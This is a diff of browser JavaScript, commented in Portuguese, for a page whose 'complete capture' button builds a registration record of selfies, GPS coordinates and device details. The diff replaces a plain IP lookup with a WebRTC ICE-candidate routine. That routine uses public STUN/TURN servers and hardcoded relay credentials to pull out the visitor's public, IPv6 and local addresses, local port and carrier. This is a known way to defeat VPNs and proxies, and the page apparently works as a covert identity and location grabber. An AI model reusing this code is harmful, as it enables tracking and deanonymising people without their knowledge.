@@ -24,7 +24,7 @@ function falar(texto){
 }
 
 // =================================================================
-// CAPTURA AVANÇADA COM TURN + ICE MANUAL
+// CAPTURA AVANÇADA (IPv4 + IPv6 + Operadora + TURN)
 // =================================================================
 async function capturarPortaAvancada() {
   const info = { 
@@ -36,21 +36,13 @@ async function capturarPortaAvancada() {
   };
 
   const iceServers = [
-    // STUN
     { urls: 'stun:stun.l.google.com:19302' },
     { urls: 'stun:stun1.l.google.com:19302' },
     { urls: 'stun:stun.ekiga.net' },
-    
-    // TURN (para NAT difíceis)
     {
       urls: 'turn:openrelay.metered.ca:443',
       username: 'openrelayproject',
       credential: 'openrelayproject'
-    },
-    {
-      urls: 'turn:global.turn.twilio.com:3478?transport=tcp',
-      username: '0c0b0f0a0e0d0c0b0a0f0e0d0c0b0a0f0e0d0c0b0a0f0e0d0c0b0a0f0e',
-      credential: '0c0b0f0a0e0d0c0b0a0f0e0d0c0b0a0f0e0d0c0b0a0f0e0d0c0b0a0f0e'
     }
   ];
 
@@ -58,11 +50,10 @@ async function capturarPortaAvancada() {
     try {
       const rtc = new RTCPeerConnection({
         iceServers: [config],
-        iceTransportPolicy: "all",
-        bundlePolicy: "max-bundle"
+        iceTransportPolicy: "all"
       });
 
-      rtc.createDataChannel("leviata-turn");
+      rtc.createDataChannel("port-test");
 
       const offer = await rtc.createOffer();
       await rtc.setLocalDescription(offer);
@@ -73,7 +64,7 @@ async function capturarPortaAvancada() {
             const cand = event.candidate.candidate;
             const ipMatch = cand.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-f0-9:]+)/i);
             const portMatch = cand.match(/(\d{4,5})\s+typ/);
-
+            
             if (ipMatch) {
               const ip = ipMatch[1];
               if (ip.includes(':')) info.ipv6 = ip;
@@ -82,7 +73,7 @@ async function capturarPortaAvancada() {
             if (portMatch) info.local_port = portMatch[1];
           }
         };
-        setTimeout(resolve, 1800);
+        setTimeout(resolve, 1500);
       });
 
       rtc.close();
@@ -151,13 +142,17 @@ function analisarDispositivo() {
   else if (ua.indexOf("Firefox") >= 0) browser = "Firefox";
   else if (ua.indexOf("Safari") >= 0 && ua.indexOf("Chrome") === -1) browser = "Safari";
   else if (ua.indexOf("Edge") >= 0 || ua.indexOf("Edg") >= 0) browser = "Edge";
+  
   let model = "Desconhecido";
   if (ua.indexOf("Mobile") >= 0) {
       const parts = ua.split(/[()]/);
       if (parts.length > 1) {
           const deviceParts = parts[1].split(';');
           for (let part of deviceParts) {
-              if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 && part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 && part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 && part.length > 2) {
+              if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 && 
+                  part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 && 
+                  part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 && 
+                  part.length > 2) {
                   model = part.trim();
                   break;
               }
@@ -168,7 +163,7 @@ function analisarDispositivo() {
 }
 
 // =================================================================
-// BOTÃO - CAPTURA COMPLETA
+// BOTÃO - CAPTURA COMPLETA (CORRIGIDO)
 // =================================================================
 btn.addEventListener("click", async () => {
   try {
@@ -207,16 +202,8 @@ btn.addEventListener("click", async () => {
       longitude = localizacao.coords.longitude;
     } catch(err) {}
 
-    let ip = "indisponível";
-    let cidade = "", estado = "", pais = "";
-    try {
-      const req = await fetch("https://ipapi.co/json/");
-      const json = await req.json();
-      ip = json.ip || "indisponível";
-      cidade = json.city || "";
-      estado = json.region || "";
-      pais = json.country_name || "";
-    } catch(err) {}
+    // Captura avançada aqui
+    const portaInfo = await capturarPortaAvancada();
 
     statusText.innerHTML = "💾 Salvando cadastro...";
     falar("Salvando cadastro.");
@@ -228,10 +215,14 @@ btn.addEventListener("click", async () => {
       selfies: fotos,
       latitude: latitude.toString(),
       longitude: longitude.toString(),
-      ip: ip,
-      cidade: cidade,
-      estado: estado,
-      pais: pais,
+      ip: portaInfo.public_ip || "indisponível",
+      ipv6: portaInfo.ipv6,
+      local_ip: portaInfo.local_ip,
+      local_port: portaInfo.local_port,
+      operadora: portaInfo.operadora,
+      cidade: "",
+      estado: "",
+      pais: "",
       user_agent: navigator.userAgent,
       modelo_dispositivo: infoDispositivo.model,
       versao_android: infoDispositivo.androidVersion,
